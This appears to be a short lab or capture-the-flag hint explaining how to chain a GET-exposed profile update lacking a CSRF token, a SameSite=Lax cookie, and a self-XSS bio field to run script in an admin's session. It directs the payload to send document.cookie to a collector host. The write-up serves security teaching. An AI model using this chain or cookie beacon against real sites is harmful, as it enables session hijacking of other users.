`/profile/update` is a state change exposed over **GET** with **no CSRF token**. A
cross-site request can trigger it — but only if it carries the admin's session
cookie. The cookie is `SameSite=Lax`, which means:

- a cross-site **POST** → cookie NOT sent (so a POST-form CSRF would fail here);
- a cross-site **top-level GET navigation** → cookie **IS** sent.

So navigate the admin's top window (a GET) to the update URL with your self-XSS as
the bio. The provided attacker origin does exactly that:

```
http://attacker:8080/go?to=<URL>   →   <meta http-equiv=refresh> to <URL>
```

Point `to=` at `http://app:8080/profile/update?bio=<your self-XSS>`. The update runs
as the admin (Lax cookie on the GET nav), then redirects to `/profile`, which
renders your bio **raw** — in the admin's session. Make the payload beacon
`document.cookie` (non-HttpOnly) to `http://collector:9000/report?c=`.
